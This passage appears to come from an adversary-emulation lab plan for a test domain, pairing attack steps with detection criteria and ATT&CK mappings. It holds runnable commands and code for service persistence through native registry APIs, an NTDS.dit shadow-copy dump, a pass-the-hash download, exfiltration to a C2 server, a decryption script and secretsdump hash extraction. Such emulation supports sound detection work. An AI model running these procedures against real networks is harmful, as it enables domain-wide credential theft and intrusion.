| NtServiceInstaller.exe NT native registry-backed service creation of OracleXAService on DC01 | Persistence | T1543.003 | Create or Modify System Process: Windows Service | Windows | [NtServiceInstaller.exe on DC01] Sysmon EC=12 creates new subkey `HKLM\SYSTEM\CurrentControlSet\Services\OracleXAService` and its process lineage runs cmd.exe ← `C:\Windows\Temp\smbpipe-agent.exe` - service-key creation outside SCM lineage (services.exe absent from the creating tree). | Calibrated - Not Benign | - | `NtServiceInstaller.exe` (spawned by `smbpipe-agent.exe` as `TESTLAB\Administrator`) writes the service configuration directly to `HKLM\SYSTEM\CurrentControlSet\Services\OracleXAService` via `NtCreateKey` + `NtSetValueKey` - `Type=16`, `Start=2`, `ImagePath=C:\Windows\Temp\smbpipe-agent.exe`, `ObjectName=LocalSystem`; no `CreateServiceW` call, no System Event ID 7045 | DC01 (TBD) | TESTLAB\Administrator | [NtServiceInstaller](../resources/payloads/persistence/windows-service/syscalls-cpp/) | - |
| NtServiceInstaller.exe NtCreateKey NtSetValueKey NT native registry API service write | Execution | T1106 | Native API | Windows | [NtServiceInstaller.exe on DC01] native-API monitoring records the direct ntdll syscall sequence `NtOpenKey → NtCreateKey → NtSetValueKey → NtClose` against `\Registry\Machine\SYSTEM\CurrentControlSet\Services` and in-memory capability scan flags the image resolving these Nt* functions at runtime with a sparse import table holding only 2 imported functions (kernel32 exports). | Calibrated - Not Benign | - | `NtServiceInstaller.exe` (spawned by `smbpipe-agent.exe` as `TESTLAB\Administrator`) resolves `NtOpenKey`, `NtCreateKey`, `NtSetValueKey`, and `NtClose` from ntdll.dll at runtime and writes the service key via NT native registry APIs - bypassing advapi32.dll registry function hooks | DC01 (TBD) | TESTLAB\Administrator | [NtServiceInstaller](../resources/payloads/persistence/windows-service/syscalls-cpp/) | - |
| NtServiceInstaller.exe NT native registry value write to OracleXAService service key | Defense Impairment | T1112 | Modify Registry | Windows | [NtServiceInstaller.exe on DC01] Sysmon EC=13 sets registry values `Type`, `Start`, `ErrorControl`, `ImagePath`, `DisplayName`, `ObjectName` under `HKLM\SYSTEM\CurrentControlSet\Services\OracleXAService` with `Start=2` and `ImagePath=C:\Windows\Temp\smbpipe-agent.exe` - value-set batch materializing an autostart LocalSystem service pointing at a Temp-directory binary. | Calibrated - Not Benign | - | `NtServiceInstaller.exe` writes registry values `Type`, `Start`, `ErrorControl`, `ImagePath`, `DisplayName`, `ObjectName` under `HKLM\SYSTEM\CurrentControlSet\Services\OracleXAService` via `NtSetValueKey` - registry modification is the mechanism used to create the persistent service | DC01 (TBD) | TESTLAB\Administrator | [NtServiceInstaller](../resources/payloads/persistence/windows-service/syscalls-cpp/) | - |

---

## Step 5 - Credential Access: NTDS Raw Dump via NtdsRawDump on DC01

### Voice Track

With persistent access to DC01 established, the adversary targets the Active Directory database. Through the pipe C2 channel, a single `PolicySyncSvc.exe` invocation performs the complete credential harvest. The tool creates a Volume Shadow Copy of `C:` via WMI — no `vssadmin.exe` process spawned — and reads `ntds.dit`, `SYSTEM`, `SAM`, and `SECURITY` from the shadow at the raw storage layer, bypassing the filesystem minifilter stack entirely. The files are encrypted, archived in memory, and written to disk as `certstore.cmd` — a batch-file wrapper that conceals the encrypted payload as a base64 blob. With `--cleanup`, the shadow copy and all intermediate staging files are removed before the final container is written, leaving only `certstore.cmd` on DC01.

### Procedures

1. ☣️ Execute the credential dump tool on DC01 via the pipe C2 channel:

   ```
   xprun-out C:\ProgramData\go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a oraclexa "C:\Windows\Temp\PolicySyncSvc.exe C:\ProgramData\CertStore --cleanup"
   ```

   - ***Expected Output***
     ```text
     [*] Initializing store consistency snapshot...
     [+] Snapshot acquired.
     [*] Cluster alignment: 4096 bytes
     [*] Processing trust anchor database... <N> bytes
     [*] Processing machine configuration store... <N> bytes
     [*] Processing account authority store... <N> bytes
     [*] Processing extended trust policy store... <N> bytes
     [+] Completed. 4/4 stores processed.
     [*] Compressing store bundle...
     [*] Cleaning up intermediates...
     [+] Cleanup done.
     [+] Bundle written: C:\ProgramData\certstore.cmd (<N> bytes)
     ```

   > `--cleanup` deletes the VSS shadow copy and `C:\ProgramData\CertStore\` before writing `certstore.cmd` - only the final encrypted container remains on DC01 disk.

2. Verify the output container exists:

   ```
   xprun-out C:\ProgramData\go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a oraclexa "dir C:\ProgramData\certstore.cmd"
   ```

   - ***Expected Output***
     ```text
     ...  certstore.cmd
     ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| PolicySyncSvc.exe Win32_ShadowCopy.Create WMI volume shadow copy creation | Execution | T1047 | Windows Management Instrumentation | Windows | [PolicySyncSvc.exe on DC01] WMI-Activity Operational log records `Win32_ShadowCopy.Create` (and a paired `.Delete()`) with client process `PolicySyncSvc.exe` in the cmd.exe→smbpipe-agent.exe lineage, and Microsoft-Windows-VSS/System log shows corresponding VolSvc/volsnap shadow-copy activity within seconds - baseline: only backup tooling creates shadow copies and none runs during the test window. | Calibrated - Not Benign | - | `PolicySyncSvc.exe` creates and deletes a VSS shadow copy via WMI `Win32_ShadowCopy.Create()`/`.Delete()` - non-backup process creates volume shadow copy through programmatic COM instead of `vssadmin.exe` | DC01 (TBD) | TESTLAB\Administrator | [NtdsRawDump](../resources/payloads/cred-access/NtdsRawDump/) | - |
| PolicySyncSvc.exe FILE_FLAG_BACKUP_SEMANTICS open NTDS.dit on VSS shadow path | Credential Access | T1003.003 | OS Credential Dumping: NTDS | Windows | [PolicySyncSvc.exe on DC01] Security 4663/4656 records a handle open to `\??\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\ntds.dit` requesting ReadData with Backup semantics (access mask incl. `Backup`/`ReadData`) where the opening process image is `PolicySyncSvc.exe` under the cmd.exe→smbpipe-agent.exe tree - baseline: no process outside backup infrastructure ever opens ntds.dit, including under any shadow-copy namespace. | Calibrated - Not Benign | - | `PolicySyncSvc.exe` (spawned by `smbpipe-agent.exe` as `TESTLAB\Administrator`) opens `ntds.dit` under the VSS shadow path with `FILE_FLAG_BACKUP_SEMANTICS` to retrieve its NTFS cluster map via `FSCTL_GET_RETRIEVAL_POINTERS` - NTDS namespace access is the credential-targeting signal; actual data read via raw volume device handle (T1006) | DC01 (TBD) | TESTLAB\Administrator | [NtdsRawDump](../resources/payloads/cred-access/NtdsRawDump/) | - |
| PolicySyncSvc.exe raw ReadFile volume device handle VSS shadow cluster read | Stealth | T1006 | Direct Volume Access | Windows | [PolicySyncSvc.exe on DC01] Security 4656 records a handle open to device object `\Device\HarddiskVolumeShadowCopyN` with ReadData access by `PolicySyncSvc.exe`, followed by sustained sequential reads against the device - baseline: no user process opens raw volume-device handles; only volsnap/VSS service context touches these objects. | Calibrated - Not Benign | - | `PolicySyncSvc.exe` opens the shadow volume device (`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN`) and reads NTFS cluster data for `ntds.dit`, `SYSTEM`, `SAM`, `SECURITY` via raw `ReadFile` at LCN byte offsets - reads bypass the WdFilter.sys filesystem minifilter | DC01 (TBD) | TESTLAB\Administrator | [NtdsRawDump](../resources/payloads/cred-access/NtdsRawDump/) | - |
| PolicySyncSvc.exe System.IO.Compression ZipArchive MemoryStream in-process ZIP assembly | Collection | T1560.002 | Archive Collected Data: Archive via Library | Windows | [PolicySyncSvc.exe on DC01] Sysmon EC=11 records a burst create of four `.tmp` files under `C:\ProgramData\CertStore\` followed by rapid delete of the whole directory - the on-disk staging churn that feeds the in-memory ZipArchive; the ZIP assembly itself (MemoryStream, no child process, no intermediate .zip) leaves no separate artifact and is witnessed only through this staging pattern. | Not Calibrated - Not Benign | staging | `ZipArchive` over `MemoryStream` compresses the four encrypted credential `.tmp` files entirely in-process - no child archival process spawned, no intermediate ZIP file on disk | DC01 (TBD) | TESTLAB\Administrator | [NtdsRawDump](../resources/payloads/cred-access/NtdsRawDump/) | - |
| PolicySyncSvc.exe AES-256-CBC custom archive batch wrapper certstore.cmd write | Collection | T1560.003 | Archive Collected Data: Archive via Custom Method | Windows | [PolicySyncSvc.exe on DC01] Sysmon EC=11 records file-create of `C:\ProgramData\certstore.cmd` immediately after the `CertStore\` directory deletion, and YARA scan at creation matches: ASCII `@echo off`/`set _b=` header followed by a single multi-megabyte base64 blob - `.cmd`-extension file with base64 blob body is a content/extension mismatch no legitimate batch script exhibits. | Calibrated - Not Benign | - | `PolicySyncSvc.exe` applies AES-256-CBC (`AesCryptoServiceProvider`) per-file and over the in-memory ZIP, base64-encodes the result, and wraps it in a `@echo off` batch stub writing `certstore.cmd` to `C:\ProgramData\` - custom archive format combining AES encryption, base64, and batch-file camouflage | DC01 (TBD) | TESTLAB\Administrator | [NtdsRawDump](../resources/payloads/cred-access/NtdsRawDump/) | - |

---

## Step 6 - Collection and Exfiltration: Transfer NTDS Container to Attacker

### Voice Track

With `certstore.cmd` staged on DC01, the adversary retrieves it through the multi-hop channel: `go-thehash.exe` authenticates to DC01 via Pass-the-Hash and downloads the container from the `C$` administrative share to IIS01. From IIS01, the same database exfiltration channel used in Phase 3 carries the file back to the controlServer. On the attacker machine, the batch-file wrapper is decoded and decrypted to recover the raw credential files, and `impacket-secretsdump` extracts every domain account's NTLM hash offline — the objective of the entire operation chain.

### Procedures

**A - Download from DC01 to IIS01 via SMB admin share**

1. ☣️ Download `certstore.cmd` from DC01:

   ```
   xprun-out C:\ProgramData\go-thehash.exe get DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\certstore.cmd C:\ProgramData\certstore.cmd
   ```

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB\Administrator
     [+] Downloaded XXXXXXXX bytes → C:\ProgramData\certstore.cmd
     ```

**B - Exfil from IIS01 to controlServer**

2. ☣️ Exfil `certstore.cmd` via chunked MSSQL/TONESHELL channel:

   ```
   xpexfil-hex C:\ProgramData\certstore.cmd certstore.cmd 600 8
   ```

**C - Offline decrypt and credential extraction (attacker machine)**

3. ☣️ Decrypt `certstore.cmd` and extract the archive on the attacker machine:

   ```python
   from Crypto.Cipher import AES
   import os, zipfile, base64

   # AES key is embedded in PolicySyncSvc.exe at build time — retrieve from resources/payloads/cred-access/NtdsRawDump/README.md
   KEY = bytes.fromhex('<AES_KEY_HEX>')

   def aes_decrypt(data):
       iv, ct = data[:16], data[16:]
       pt = AES.new(KEY, AES.MODE_CBC, iv).decrypt(ct)
       return pt[:-pt[-1]]  # PKCS7 unpad

   # Step 1 - parse base64 wrapper, decrypt, extract archive
   with open('certstore.cmd', 'r', encoding='ascii') as f:
       for line in f:
           if line.startswith('set _b='):
               enc_data = base64.b64decode(line[7:].strip())
               break
   zip_data = aes_decrypt(enc_data)
   open('certstore.zip', 'wb').write(zip_data)
   with zipfile.ZipFile('certstore.zip') as z:
       z.extractall('certstore/')
   os.remove('certstore.zip')

   # Step 2 - decrypt individual credential files (raw binary format)
   for s, d in [('ntds.tmp','ntds.dit'),('system.tmp','SYSTEM.hiv'),
                ('sam.tmp','SAM.hiv'),('security.tmp','SECURITY.hiv')]:
       p = 'certstore/' + s
       if os.path.exists(p):
           open('certstore/' + d, 'wb').write(aes_decrypt(open(p,'rb').read()))
           print('[+]', s, '->', d)
   ```

   - ***Expected Output***
     ```text
     [+] ntds.tmp -> ntds.dit
     [+] system.tmp -> SYSTEM.hiv
     [+] sam.tmp -> SAM.hiv
     [+] security.tmp -> SECURITY.hiv
     ```

4. ☣️ Run offline credential extraction:

   ```bash
   impacket-secretsdump -ntds certstore/ntds.dit -system certstore/SYSTEM.hiv -sam certstore/SAM.hiv LOCAL
   ```

   - ***Expected Output***
     ```text
     [*] Target system bootKey: 0x<syskey>
     [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
     [*] Searching for pekList, be patient
     [*] PEK # 0 found and decrypted: <pek>
     [*] Reading and decrypting hashes from certstore/ntds.dit
     Administrator:500:aad3b435b51404eeaad3b435b51404ee:<hash>:::
     Guest:501:aad3b435b51404eeaad3b435b51404ee:<hash>:::
     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<hash>:::
     labuser:1103:aad3b435b51404eeaad3b435b51404ee:<hash>:::
     svc_app_dev:1104:aad3b435b51404eeaad3b435b51404ee:<hash>:::
     ...
     ```

### Reference Tables

<!-- Step 6 download (go-thehash PtH SMB2 C$ read of certstore.cmd) reuses the T1550.002 / T1021.002 primitives already scored in Step 2 - not re-scored here. -->

<!-- xpexfil-hex mechanism behaviors (IIS01 OPENROWSET(BULK) + T-SQL hex INSERT → WS01 PowerShell SqlClient hex text write → TONESHELL FILE_UPLOAD → C2 bytes.fromhex() → cleanup) are identical to Phase 3 Step 3 and are not re-scored here. -->

<!-- Step 6C (offline decrypt + impacket-secretsdump) executes on the attacker machine - outside the lab. Off the declared Surface Profile - not scored. -->

---

